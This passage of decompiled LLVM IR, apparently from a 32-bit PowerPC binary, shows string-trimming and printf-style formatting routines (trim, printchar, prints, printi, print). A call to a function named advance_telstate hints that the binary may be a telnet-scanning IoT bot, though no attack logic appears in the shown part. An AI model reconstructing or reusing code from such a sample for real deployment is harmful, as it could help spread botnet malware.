  %v3_10000ac4 = call i32 @advance_telstate(i32* %v2_10000ac4, i32 0)
  %v3_10000ad0 = add i32 %arg1, 9
  %v4_10000ad0 = inttoptr i32 %v3_10000ad0 to i8*
  store i8 1, i8* %v4_10000ad0, align 1
  ret i32 %v3_10000ac4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @trim(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10000b10 = call i32 @__GI_strlen()
  store i32 %v0_10000b10, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000b34

dec_label_pc_10000b28:                            ; preds = %dec_label_pc_10000b34
  %v1_10000b2c = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_10000b34

dec_label_pc_10000b34:                            ; preds = %entry, %dec_label_pc_10000b28
  %stack_var_-36.0 = phi i32 [ 0, %entry ], [ %v1_10000b2c, %dec_label_pc_10000b28 ]
  %v2_10000b40 = add i32 %stack_var_-36.0, %arg1
  %v3_10000b40 = inttoptr i32 %v2_10000b40 to i8*
  %v3_10000b44 = load i8, i8* %v3_10000b40, align 1
  %v4_10000b44 = zext i8 %v3_10000b44 to i32
  store i32 %v4_10000b44, i32* %r3.global-to-local, align 4
  %v3_10000b54 = call i32 @isspace(i32 %v4_10000b44, i32 %v2_10000b40)
  store i32 %v3_10000b54, i32* %r3.global-to-local, align 4
  %v3_10000b5c = icmp eq i32 %v3_10000b54, 0
  br i1 %v3_10000b5c, label %dec_label_pc_10000b74.preheader, label %dec_label_pc_10000b28

dec_label_pc_10000b74.preheader:                  ; preds = %dec_label_pc_10000b34
  %v1_10000b1c = add i32 %v0_10000b10, -1
  %v2_10000b7c7 = icmp slt i32 %v1_10000b1c, %stack_var_-36.0
  br i1 %v2_10000b7c7, label %dec_label_pc_10000c00.preheader, label %dec_label_pc_10000b84

dec_label_pc_10000b68:                            ; preds = %dec_label_pc_10000b84
  %v1_10000b6c = add i32 %stack_var_-40.010, -1
  %v2_10000b7c = icmp slt i32 %v1_10000b6c, %stack_var_-36.0
  br i1 %v2_10000b7c, label %dec_label_pc_10000c00.preheader, label %dec_label_pc_10000b84

dec_label_pc_10000b84:                            ; preds = %dec_label_pc_10000b74.preheader, %dec_label_pc_10000b68
  %stack_var_-40.010 = phi i32 [ %v1_10000b6c, %dec_label_pc_10000b68 ], [ %v1_10000b1c, %dec_label_pc_10000b74.preheader ]
  %v2_10000b90 = add i32 %stack_var_-40.010, %arg1
  %v3_10000b90 = inttoptr i32 %v2_10000b90 to i8*
  %v3_10000b94 = load i8, i8* %v3_10000b90, align 1
  %v4_10000b94 = zext i8 %v3_10000b94 to i32
  store i32 %v4_10000b94, i32* %r3.global-to-local, align 4
  %v3_10000ba4 = call i32 @isspace(i32 %v4_10000b94, i32 %v2_10000b90)
  store i32 %v3_10000ba4, i32* %r3.global-to-local, align 4
  %v3_10000bac = icmp eq i32 %v3_10000ba4, 0
  br i1 %v3_10000bac, label %dec_label_pc_10000c00.preheader, label %dec_label_pc_10000b68

dec_label_pc_10000c00.preheader:                  ; preds = %dec_label_pc_10000b68, %dec_label_pc_10000b84, %dec_label_pc_10000b74.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %v1_10000b1c, %dec_label_pc_10000b74.preheader ], [ %v1_10000b6c, %dec_label_pc_10000b68 ], [ %stack_var_-40.010, %dec_label_pc_10000b84 ]
  %v3_10000c083 = icmp sgt i32 %stack_var_-36.0, %stack_var_-40.0.lcssa
  br i1 %v3_10000c083, label %dec_label_pc_10000c10, label %dec_label_pc_10000bc0

dec_label_pc_10000bc0:                            ; preds = %dec_label_pc_10000c00.preheader, %dec_label_pc_10000bc0
  %v2_10000c246 = phi i32 [ %v2_10000c24, %dec_label_pc_10000bc0 ], [ %arg1, %dec_label_pc_10000c00.preheader ]
  %storemerge15 = phi i32 [ %v1_10000bf8, %dec_label_pc_10000bc0 ], [ %stack_var_-36.0, %dec_label_pc_10000c00.preheader ]
  %v2_10000be4 = add i32 %storemerge15, %arg1
  %v1_10000be8 = inttoptr i32 %v2_10000be4 to i8*
  %v2_10000be8 = load i8, i8* %v1_10000be8, align 1
  %v3_10000bf0 = inttoptr i32 %v2_10000c246 to i8*
  store i8 %v2_10000be8, i8* %v3_10000bf0, align 1
  %v1_10000bf8 = add i32 %storemerge15, 1
  %v3_10000c08 = icmp sgt i32 %v1_10000bf8, %stack_var_-40.0.lcssa
  %v2_10000c18 = sub i32 %v1_10000bf8, %stack_var_-36.0
  %v2_10000c24 = add i32 %v2_10000c18, %arg1
  br i1 %v3_10000c08, label %dec_label_pc_10000c10, label %dec_label_pc_10000bc0

dec_label_pc_10000c10:                            ; preds = %dec_label_pc_10000bc0, %dec_label_pc_10000c00.preheader
  %v2_10000c24.lcssa = phi i32 [ %arg1, %dec_label_pc_10000c00.preheader ], [ %v2_10000c24, %dec_label_pc_10000bc0 ]
  %v3_10000c2c = inttoptr i32 %v2_10000c24.lcssa to i8*
  store i8 0, i8* %v3_10000c2c, align 1
  %v0_10000c44 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10000c44

; uselistorder directives
  uselistorder i32 %v1_10000bf8, { 2, 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_10000b1c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-36.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 4, 3, 1, 5, 2, 6, 0 }
  uselistorder i32 (i32, i32)* @isspace, { 1, 0 }
  uselistorder i32 %arg1, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder label %dec_label_pc_10000bc0, { 1, 0 }
  uselistorder label %dec_label_pc_10000c00.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000b84, { 1, 0 }
  uselistorder label %dec_label_pc_10000b34, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_10000c5c = load i32, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-20, align 4
  %v3_10000c68 = icmp eq i32 %v0_10000c5c, 0
  br i1 %v3_10000c68, label %dec_label_pc_10000c9c, label %dec_label_pc_10000c70

dec_label_pc_10000c70:                            ; preds = %entry
  %v1_10000c74 = inttoptr i32 %v0_10000c5c to i32*
  %v2_10000c74 = load i32, i32* %v1_10000c74, align 4
  %v1_10000c80 = trunc i32 %arg2 to i8
  %v3_10000c80 = inttoptr i32 %v2_10000c74 to i8*
  store i8 %v1_10000c80, i8* %v3_10000c80, align 1
  %v2_10000c88 = load i32, i32* %v1_10000c74, align 4
  %v1_10000c8c = add i32 %v2_10000c88, 1
  store i32 %v1_10000c8c, i32* %v1_10000c74, align 4
  %v0_10000cc4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000cb0

dec_label_pc_10000c9c:                            ; preds = %entry
  %v2_10000c9c = ptrtoint i32* %stack_var_-20 to i32
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268438704, i32* @lr, align 4
  %v2_10000cac = call i32 @__libc_write(i32 1, i32 %v2_10000c9c)
  store i32 %v2_10000cac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000cb0

dec_label_pc_10000cb0:                            ; preds = %dec_label_pc_10000c70, %dec_label_pc_10000c9c
  %v0_10000cc4 = phi i32 [ %v0_10000cc4.pre, %dec_label_pc_10000c70 ], [ %v2_10000cac, %dec_label_pc_10000c9c ]
  ret i32 %v0_10000cc4

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10000cb0, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp45 = icmp slt i32 %arg3, 1
  br i1 %tmp45, label %dec_label_pc_10000d8c, label %dec_label_pc_10000d08

dec_label_pc_10000d08:                            ; preds = %entry
  %v2_10000d3826 = load i8, i8* %arg2, align 1
  %v3_10000d4029 = icmp eq i8 %v2_10000d3826, 0
  br i1 %v3_10000d4029, label %dec_label_pc_10000d48, label %dec_label_pc_10000d1c

dec_label_pc_10000d1c:                            ; preds = %dec_label_pc_10000d08, %dec_label_pc_10000d1c
  %v4_10000d3431 = phi i32 [ %v1_10000d2c, %dec_label_pc_10000d1c ], [ %tmp, %dec_label_pc_10000d08 ]
  %stack_var_-20.030 = phi i32 [ %v1_10000d20, %dec_label_pc_10000d1c ], [ 0, %dec_label_pc_10000d08 ]
  %v1_10000d20 = add i32 %stack_var_-20.030, 1
  %v1_10000d2c = add i32 %v4_10000d3431, 1
  %v5_10000d30 = inttoptr i32 %v1_10000d2c to i8*
  %v2_10000d38 = load i8, i8* %v5_10000d30, align 1
  %v3_10000d40 = icmp eq i8 %v2_10000d38, 0
  br i1 %v3_10000d40, label %dec_label_pc_10000d48, label %dec_label_pc_10000d1c

dec_label_pc_10000d48:                            ; preds = %dec_label_pc_10000d1c, %dec_label_pc_10000d08
  %stack_var_-20.0.lcssa = phi i32 [ 0, %dec_label_pc_10000d08 ], [ %v1_10000d20, %dec_label_pc_10000d1c ]
  %v2_10000d50 = icmp slt i32 %stack_var_-20.0.lcssa, %arg3
  br i1 %v2_10000d50, label %dec_label_pc_10000d64, label %dec_label_pc_10000d74

dec_label_pc_10000d64:                            ; preds = %dec_label_pc_10000d48
  %v2_10000d6c = sub i32 %arg3, %stack_var_-20.0.lcssa
  br label %dec_label_pc_10000d74

dec_label_pc_10000d74:                            ; preds = %dec_label_pc_10000d48, %dec_label_pc_10000d64
  %storemerge3 = phi i32 [ %v2_10000d6c, %dec_label_pc_10000d64 ], [ 0, %dec_label_pc_10000d48 ]
  %v1_10000d78 = call i32 @__asm_rlwinm(i32 %arg4, i32 0, i32 30, i32 30)
  %v3_10000d7c = icmp eq i32 %v1_10000d78, 0
  br i1 %v3_10000d7c, label %dec_label_pc_10000d8c, label %dec_label_pc_10000d84

dec_label_pc_10000d84:                            ; preds = %dec_label_pc_10000d74
  br label %dec_label_pc_10000d8c

dec_label_pc_10000d8c:                            ; preds = %dec_label_pc_10000d74, %entry, %dec_label_pc_10000d84
  %stack_var_-32.0 = phi i32 [ %arg3, %entry ], [ %storemerge3, %dec_label_pc_10000d74 ], [ %storemerge3, %dec_label_pc_10000d84 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_10000d74 ], [ 48, %dec_label_pc_10000d84 ]
  %v1_10000d90 = urem i32 %arg4, 2
  %v3_10000d94 = icmp eq i32 %v1_10000d90, 0
  br i1 %v3_10000d94, label %dec_label_pc_10000dc4.preheader, label %dec_label_pc_10000e04.preheader

dec_label_pc_10000dc4.preheader:                  ; preds = %dec_label_pc_10000d8c
  %v2_10000dc819 = icmp sgt i32 %stack_var_-32.0, 0
  br i1 %v2_10000dc819, label %dec_label_pc_10000da0.lr.ph, label %dec_label_pc_10000e04.preheader

dec_label_pc_10000da0.lr.ph:                      ; preds = %dec_label_pc_10000dc4.preheader
  %v2_10000da8 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_10000da0

dec_label_pc_10000da0:                            ; preds = %dec_label_pc_10000da0.lr.ph, %dec_label_pc_10000da0
  %stack_var_-32.122 = phi i32 [ %stack_var_-32.0, %dec_label_pc_10000da0.lr.ph ], [ %v1_10000dbc, %dec_label_pc_10000da0 ]
  %v3_10000da8 = call i32 @printchar(i32* %v2_10000da8, i32 %stack_var_-16.0)
  %v1_10000dbc = add nsw i32 %stack_var_-32.122, -1
  %v2_10000dc8 = icmp sgt i32 %stack_var_-32.122, 1
  br i1 %v2_10000dc8, label %dec_label_pc_10000da0, label %dec_label_pc_10000e04.preheader

dec_label_pc_10000e04.preheader:                  ; preds = %dec_label_pc_10000da0, %dec_label_pc_10000dc4.preheader, %dec_label_pc_10000d8c
  %stack_var_-12.1.ph = phi i32 [ 0, %dec_label_pc_10000d8c ], [ 0, %dec_label_pc_10000dc4.preheader ], [ %stack_var_-32.0, %dec_label_pc_10000da0 ]
  %stack_var_-32.2.ph = phi i32 [ %stack_var_-32.0, %dec_label_pc_10000d8c ], [ %stack_var_-32.0, %dec_label_pc_10000dc4.preheader ], [ 0, %dec_label_pc_10000da0 ]
  %v2_10000e0810 = load i8, i8* %arg2, align 1
  %v3_10000e1013 = icmp eq i8 %v2_10000e0810, 0
  br i1 %v3_10000e1013, label %dec_label_pc_10000e40.preheader, label %dec_label_pc_10000dd4.lr.ph

dec_label_pc_10000dd4.lr.ph:                      ; preds = %dec_label_pc_10000e04.preheader
  %v2_10000de8 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_10000dd4

dec_label_pc_10000dd4:                            ; preds = %dec_label_pc_10000dd4.lr.ph, %dec_label_pc_10000dd4
  %v4_10000e0416 = phi i32 [ %tmp, %dec_label_pc_10000dd4.lr.ph ], [ %v1_10000dfc, %dec_label_pc_10000dd4 ]
  %stack_var_-36.015 = phi i8* [ %arg2, %dec_label_pc_10000dd4.lr.ph ], [ %v5_10000e00, %dec_label_pc_10000dd4 ]
  %stack_var_-12.114 = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10000dd4.lr.ph ], [ %v1_10000df0, %dec_label_pc_10000dd4 ]
  %v2_10000dd8 = load i8, i8* %stack_var_-36.015, align 1
  %v3_10000dd8 = zext i8 %v2_10000dd8 to i32
  %v3_10000de8 = call i32 @printchar(i32* %v2_10000de8, i32 %v3_10000dd8)
  %v1_10000df0 = add i32 %stack_var_-12.114, 1
  %v1_10000dfc = add i32 %v4_10000e0416, 1
  %v5_10000e00 = inttoptr i32 %v1_10000dfc to i8*
  %v2_10000e08 = load i8, i8* %v5_10000e00, align 1
  %v3_10000e10 = icmp eq i8 %v2_10000e08, 0
  br i1 %v3_10000e10, label %dec_label_pc_10000e40.preheader, label %dec_label_pc_10000dd4

dec_label_pc_10000e40.preheader:                  ; preds = %dec_label_pc_10000dd4, %dec_label_pc_10000e04.preheader
  %stack_var_-12.1.lcssa = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10000e04.preheader ], [ %v1_10000df0, %dec_label_pc_10000dd4 ]
  %v2_10000e445 = icmp sgt i32 %stack_var_-32.2.ph, 0
  br i1 %v2_10000e445, label %dec_label_pc_10000e1c.lr.ph, label %dec_label_pc_10000e4c

dec_label_pc_10000e1c.lr.ph:                      ; preds = %dec_label_pc_10000e40.preheader
  %v2_10000e24 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_10000e1c

dec_label_pc_10000e1c:                            ; preds = %dec_label_pc_10000e1c.lr.ph, %dec_label_pc_10000e1c
  %stack_var_-32.38 = phi i32 [ %stack_var_-32.2.ph, %dec_label_pc_10000e1c.lr.ph ], [ %v1_10000e38, %dec_label_pc_10000e1c ]
  %v3_10000e24 = call i32 @printchar(i32* %v2_10000e24, i32 %stack_var_-16.0)
  %v1_10000e38 = add nsw i32 %stack_var_-32.38, -1
  %v2_10000e44 = icmp sgt i32 %stack_var_-32.38, 1
  br i1 %v2_10000e44, label %dec_label_pc_10000e1c, label %dec_label_pc_10000e40.dec_label_pc_10000e4c_crit_edge

dec_label_pc_10000e40.dec_label_pc_10000e4c_crit_edge: ; preds = %dec_label_pc_10000e1c
  %tmp46 = add i32 %stack_var_-12.1.lcssa, %stack_var_-32.2.ph
  br label %dec_label_pc_10000e4c

dec_label_pc_10000e4c:                            ; preds = %dec_label_pc_10000e40.dec_label_pc_10000e4c_crit_edge, %dec_label_pc_10000e40.preheader
  %stack_var_-12.2.lcssa = phi i32 [ %tmp46, %dec_label_pc_10000e40.dec_label_pc_10000e4c_crit_edge ], [ %stack_var_-12.1.lcssa, %dec_label_pc_10000e40.preheader ]
  ret i32 %stack_var_-12.2.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-12.1.lcssa, { 1, 0 }
  uselistorder i32 %v1_10000dfc, { 1, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %stack_var_-20.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_10000d2c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000e1c, { 1, 0 }
  uselistorder label %dec_label_pc_10000dd4, { 1, 0 }
  uselistorder label %dec_label_pc_10000da0, { 1, 0 }
  uselistorder label %dec_label_pc_10000d8c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000d74, { 1, 0 }
  uselistorder label %dec_label_pc_10000d1c, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %v3_10000eb8 = icmp eq i32 %arg2, 0
  br i1 %v3_10000eb8, label %dec_label_pc_10000ec0, label %dec_label_pc_10000ef4

dec_label_pc_10000ec0:                            ; preds = %entry
  store i32 48, i32* %stack_var_-88, align 4
  %v4_10000ee4 = bitcast i32* %stack_var_-88 to i8*
  %v5_10000ee4 = call i32 @prints(i32 %arg1, i8* %v4_10000ee4, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_1000104c

dec_label_pc_10000ef4:                            ; preds = %entry
  %v3_10000ef8 = icmp eq i32 %arg4, 0
  br i1 %v3_10000ef8, label %dec_label_pc_10000f2c, label %dec_label_pc_10000f00

dec_label_pc_10000f00:                            ; preds = %dec_label_pc_10000ef4
  %v3_10000f04 = icmp eq i32 %arg3, 10
  br i1 %v3_10000f04, label %dec_label_pc_10000f0c, label %dec_label_pc_10000f2c

dec_label_pc_10000f0c:                            ; preds = %dec_label_pc_10000f00
  %tmp27 = icmp sgt i32 %arg2, -1
  br i1 %tmp27, label %dec_label_pc_10000f2c, label %dec_label_pc_10000f18

dec_label_pc_10000f18:                            ; preds = %dec_label_pc_10000f0c
  %v1_10000f24 = sub i32 0, %arg2
  br label %dec_label_pc_10000f2c

dec_label_pc_10000f2c:                            ; preds = %dec_label_pc_10000f00, %dec_label_pc_10000f0c, %dec_label_pc_10000ef4, %dec_label_pc_10000f18
  %stack_var_-44.0 = phi i32 [ %arg2, %dec_label_pc_10000ef4 ], [ %arg2, %dec_label_pc_10000f0c ], [ %v1_10000f24, %dec_label_pc_10000f18 ], [ %arg2, %dec_label_pc_10000f00 ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_10000ef4 ], [ 0, %dec_label_pc_10000f0c ], [ 1, %dec_label_pc_10000f18 ], [ 0, %dec_label_pc_10000f00 ]
  %tmp28 = bitcast i32* %stack_var_-77 to i8*
  store i8 0, i8* %tmp28, align 4
  %v3_10000fb85 = icmp eq i32 %stack_var_-44.0, 0
  br i1 %v3_10000fb85, label %dec_label_pc_10000fc0, label %dec_label_pc_10000f44.lr.ph

dec_label_pc_10000f44.lr.ph:                      ; preds = %dec_label_pc_10000f2c
  %v2_10000f74 = add i32 %arg7, -58
  br label %dec_label_pc_10000f44

dec_label_pc_10000f44:                            ; preds = %dec_label_pc_10000f44.lr.ph, %dec_label_pc_10000f80
  %stack_var_-44.17 = phi i32 [ %stack_var_-44.0, %dec_label_pc_10000f44.lr.ph ], [ %v2_10000fac, %dec_label_pc_10000f80 ]
  %stack_var_-28.06 = phi i8* [ %tmp28, %dec_label_pc_10000f44.lr.ph ], [ %v5_10000f88, %dec_label_pc_10000f80 ]
  %v2_10000f4c = urem i32 %stack_var_-44.17, %arg3
  %tmp29 = icmp slt i32 %v2_10000f4c, 10
  br i1 %tmp29, label %dec_label_pc_10000f80, label %dec_label_pc_10000f6c

dec_label_pc_10000f6c:                            ; preds = %dec_label_pc_10000f44
  %v1_10000f78 = add i32 %v2_10000f74, %v2_10000f4c
  br label %dec_label_pc_10000f80

dec_label_pc_10000f80:                            ; preds = %dec_label_pc_10000f44, %dec_label_pc_10000f6c
  %stack_var_-32.0 = phi i32 [ %v2_10000f4c, %dec_label_pc_10000f44 ], [ %v1_10000f78, %dec_label_pc_10000f6c ]
  %v4_10000f80 = ptrtoint i8* %stack_var_-28.06 to i32
  %v1_10000f84 = add i32 %v4_10000f80, -1
  %v5_10000f88 = inttoptr i32 %v1_10000f84 to i8*
  %fold = add i32 %stack_var_-32.0, 48
  %v1_10000fa0 = trunc i32 %fold to i8
  store i8 %v1_10000fa0, i8* %v5_10000f88, align 1
  %v2_10000fac = udiv i32 %stack_var_-44.17, %arg3
  %v3_10000fb8 = icmp ult i32 %stack_var_-44.17, %arg3
  br i1 %v3_10000fb8, label %dec_label_pc_10000fc0, label %dec_label_pc_10000f44

dec_label_pc_10000fc0:                            ; preds = %dec_label_pc_10000f80, %dec_label_pc_10000f2c
  %stack_var_-28.0.lcssa = phi i8* [ %tmp28, %dec_label_pc_10000f2c ], [ %v5_10000f88, %dec_label_pc_10000f80 ]
  %v3_10000fc4 = icmp eq i32 %stack_var_-36.0, 0
  br i1 %v3_10000fc4, label %dec_label_pc_10001028, label %dec_label_pc_10000fcc

dec_label_pc_10000fcc:                            ; preds = %dec_label_pc_10000fc0
  %v3_10000fd0 = icmp eq i32 %arg5, 0
  br i1 %v3_10000fd0, label %dec_label_pc_10001010, label %dec_label_pc_10000fd8

dec_label_pc_10000fd8:                            ; preds = %dec_label_pc_10000fcc
  %v1_10000fdc = call i32 @__asm_rlwinm(i32 %arg6, i32 0, i32 30, i32 30)
  %v3_10000fe0 = icmp eq i32 %v1_10000fdc, 0
  br i1 %v3_10000fe0, label %dec_label_pc_10001010, label %dec_label_pc_10000fe8

dec_label_pc_10000fe8:                            ; preds = %dec_label_pc_10000fd8
  %v2_10000ff0 = inttoptr i32 %arg1 to i32*
  %v3_10000ff0 = call i32 @printchar(i32* %v2_10000ff0, i32 45)
  %v1_10001004 = add i32 %arg5, -1
  br label %dec_label_pc_10001028

dec_label_pc_10001010:                            ; preds = %dec_label_pc_10000fd8, %dec_label_pc_10000fcc
  %v4_10001010 = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v1_10001014 = add i32 %v4_10001010, -1
  %v5_10001018 = inttoptr i32 %v1_10001014 to i8*
  store i8 45, i8* %v5_10001018, align 1
  br label %dec_label_pc_10001028

dec_label_pc_10001028:                            ; preds = %dec_label_pc_10000fc0, %dec_label_pc_10000fe8, %dec_label_pc_10001010
  %stack_var_-28.1 = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_10000fc0 ], [ %v5_10001018, %dec_label_pc_10001010 ], [ %stack_var_-28.0.lcssa, %dec_label_pc_10000fe8 ]
  %stack_var_-56.0 = phi i32 [ %arg5, %dec_label_pc_10000fc0 ], [ %arg5, %dec_label_pc_10001010 ], [ %v1_10001004, %dec_label_pc_10000fe8 ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_10000fc0 ], [ 0, %dec_label_pc_10001010 ], [ 1, %dec_label_pc_10000fe8 ]
  %v5_10001038 = call i32 @prints(i32 %arg1, i8* %stack_var_-28.1, i32 %stack_var_-56.0, i32 %arg6)
  %v2_10001044 = add i32 %v5_10001038, %stack_var_-40.0
  br label %dec_label_pc_1000104c

dec_label_pc_1000104c:                            ; preds = %dec_label_pc_10000ec0, %dec_label_pc_10001028
  %storemerge = phi i32 [ %v2_10001044, %dec_label_pc_10001028 ], [ %v5_10000ee4, %dec_label_pc_10000ec0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-28.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_10000f88, { 0, 2, 1 }
  uselistorder i32 %v2_10000f4c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-44.17, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 3, 0, 2, 4 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000104c, { 1, 0 }
  uselistorder label %dec_label_pc_10001028, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10000f80, { 1, 0 }
  uselistorder label %dec_label_pc_10000f44, { 1, 0 }
  uselistorder label %dec_label_pc_10000f2c, { 3, 1, 0, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp41 = ptrtoint i32* %arg1 to i32
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-68.427 = inttoptr i32 %arg2 to i8*
  %v2_1000163c28 = load i8, i8* %stack_var_-68.427, align 1
  %v3_1000164431 = icmp eq i8 %v2_1000163c28, 0
  br i1 %v3_1000164431, label %dec_label_pc_1000164c, label %dec_label_pc_10001098.lr.ph

dec_label_pc_10001098.lr.ph:                      ; preds = %entry
  %v1_1000120c = add i32 %arg3, 4
  %v2_1000120c = inttoptr i32 %v1_1000120c to i32*
  %v1_100011d4 = add i32 %arg3, 8
  %v2_100011d4 = inttoptr i32 %v1_100011d4 to i32*
  %v4_100015f0 = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_10001098

dec_label_pc_10001098:                            ; preds = %dec_label_pc_10001098.lr.ph, %dec_label_pc_1000162c
  %stack_var_-68.434 = phi i8* [ %stack_var_-68.427, %dec_label_pc_10001098.lr.ph ], [ %stack_var_-68.4, %dec_label_pc_1000162c ]
  %stack_var_-68.4.in33 = phi i32 [ %arg2, %dec_label_pc_10001098.lr.ph ], [ %v1_10001630, %dec_label_pc_1000162c ]
  %stack_var_-56.132 = phi i32 [ 0, %dec_label_pc_10001098.lr.ph ], [ %stack_var_-56.0, %dec_label_pc_1000162c ]
  %v2_1000109c = load i8, i8* %stack_var_-68.434, align 1
  %v3_100010a4 = icmp eq i8 %v2_1000109c, 37
  br i1 %v3_100010a4, label %dec_label_pc_100010ac, label %dec_label_pc_10001608

dec_label_pc_100010ac:                            ; preds = %dec_label_pc_10001098
  %v1_100010b0 = add i32 %stack_var_-68.4.in33, 1
  %v5_100010b4 = inttoptr i32 %v1_100010b0 to i8*
  %v2_100010cc = load i8, i8* %v5_100010b4, align 1
  %v3_100010d4 = icmp eq i8 %v2_100010cc, 0
  br i1 %v3_100010d4, label %dec_label_pc_1000164c, label %dec_label_pc_100010dc

dec_label_pc_100010dc:                            ; preds = %dec_label_pc_100010ac
  %v2_100010e0 = load i8, i8* %v5_100010b4, align 1
  %v3_100010e8 = icmp eq i8 %v2_100010e0, 37
  br i1 %v3_100010e8, label %dec_label_pc_10001608, label %dec_label_pc_100010f0

dec_label_pc_100010f0:                            ; preds = %dec_label_pc_100010dc
  %v2_100010f4 = load i8, i8* %v5_100010b4, align 1
  %v3_100010fc = icmp eq i8 %v2_100010f4, 45
  br i1 %v3_100010fc, label %dec_label_pc_10001104, label %dec_label_pc_10001134.preheader

dec_label_pc_10001104:                            ; preds = %dec_label_pc_100010f0
  %v1_10001108 = add i32 %stack_var_-68.4.in33, 2
  %v5_1000110c = inttoptr i32 %v1_10001108 to i8*
  br label %dec_label_pc_10001134.preheader

dec_label_pc_10001134.preheader:                  ; preds = %dec_label_pc_10001104, %dec_label_pc_100010f0
  %stack_var_-68.0.ph = phi i8* [ %v5_100010b4, %dec_label_pc_100010f0 ], [ %v5_1000110c, %dec_label_pc_10001104 ]
  %stack_var_-52.0.ph = phi i32 [ 0, %dec_label_pc_100010f0 ], [ 1, %dec_label_pc_10001104 ]
  %v4_100011343 = ptrtoint i8* %stack_var_-68.0.ph to i32
  %v2_100011384 = load i8, i8* %stack_var_-68.0.ph, align 1
  %v3_100011408 = icmp eq i8 %v2_100011384, 48
  br i1 %v3_100011408, label %dec_label_pc_1000111c, label %dec_label_pc_10001180.preheader

dec_label_pc_1000111c:                            ; preds = %dec_label_pc_10001134.preheader, %dec_label_pc_1000111c
  %v4_1000113410 = phi i32 [ %v1_10001120, %dec_label_pc_1000111c ], [ %v4_100011343, %dec_label_pc_10001134.preheader ]
  %stack_var_-52.09 = phi i32 [ %v1_1000112c, %dec_label_pc_1000111c ], [ %stack_var_-52.0.ph, %dec_label_pc_10001134.preheader ]
  %v1_10001120 = add i32 %v4_1000113410, 1
  %v5_10001124 = inttoptr i32 %v1_10001120 to i8*
  %v1_1000112c = or i32 %stack_var_-52.09, 2
  %v2_10001138 = load i8, i8* %v5_10001124, align 1
  %v3_10001140 = icmp eq i8 %v2_10001138, 48
  br i1 %v3_10001140, label %dec_label_pc_1000111c, label %dec_label_pc_10001180.preheader

dec_label_pc_10001180.preheader:                  ; preds = %dec_label_pc_1000111c, %dec_label_pc_10001134.preheader
  %stack_var_-52.0.lcssa = phi i32 [ %stack_var_-52.0.ph, %dec_label_pc_10001134.preheader ], [ %v1_1000112c, %dec_label_pc_1000111c ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.0.ph, %dec_label_pc_10001134.preheader ], [ %v5_10001124, %dec_label_pc_1000111c ]
  %v4_1000118012 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
